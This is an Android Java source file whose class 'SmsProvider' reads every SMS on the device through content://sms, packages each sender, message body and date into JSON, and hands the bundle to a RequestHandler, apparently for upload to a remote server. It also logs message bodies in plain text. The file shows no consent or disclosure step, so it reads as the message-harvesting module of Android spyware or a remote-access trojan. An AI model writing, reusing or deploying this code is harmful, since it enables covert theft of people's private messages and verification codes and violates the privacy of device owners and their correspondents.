package com.example.myandroidapps.provider;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.example.myandroidapps.R;
import com.example.myandroidapps.util.RequestHandler;

import org.json.JSONArray;
import org.json.JSONObject;

public class SmsProvider {
    private final String TAG;
    private final Context context;


    public SmsProvider(Context context){
        this.context = context;
        this.TAG = context.getResources().getString(R.string.app_name);
    }

    public void handleReportSms() {
        try(Cursor cursor= this.context.getContentResolver().query(Uri.parse("content://sms"),
                null,null,null,null)) {
            if (cursor.getCount() > 0) {
                JSONArray jsonArray = new JSONArray();
                JSONObject jsonObject = new JSONObject();
                while (cursor.moveToNext()) {
                    @SuppressLint("Range")
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    @SuppressLint("Range") String body = cursor.getString(cursor.getColumnIndex("body"));
                    @SuppressLint("Range") String date = cursor.getString(cursor.getColumnIndex("date"));
                    Log.d(TAG, "getSms: " + address);
                    Log.d(TAG, "readSms: " + body);
                    Log.d(TAG, "readSms: " + date);
                    JSONObject object = new JSONObject();
                    object.put("address", address);
                    object.put("MessageText", body);
                    object.put("Date", date);
                    jsonArray.put(object);
                    Log.d(TAG, "readSms: " + object);
                }
                jsonObject.put("UserSms", jsonArray);
                RequestHandler.handleRequest(context, "sms", jsonObject);
            }
            }catch(Exception e){
                Log.e(TAG,"Failed to report SMS",e);
            }
    }
}
